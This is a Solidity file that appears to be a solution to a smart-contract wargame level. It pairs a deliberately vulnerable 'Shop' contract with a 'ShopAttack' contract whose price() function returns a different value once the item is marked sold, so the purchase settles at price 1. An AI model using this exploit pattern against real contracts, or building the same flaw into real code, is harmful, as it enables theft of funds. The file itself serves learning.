// SPDX-License-Identifier: MIT
// 0x87ABd590e1FF1AEc94045498CdEC20B8B26eeA01
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttack is Buyer {

    Shop private immutable shop;
    bool private isHackTime = false;


    constructor(address _addr) {
        shop = Shop(_addr);
    }

    function attack() public {
        shop.buy();
        require(shop.price() == 1, "fail");
    }

    function price() override external view returns (uint) {
        if (shop.isSold() == true) {
            return 1;
        }
        return 100;
    }

}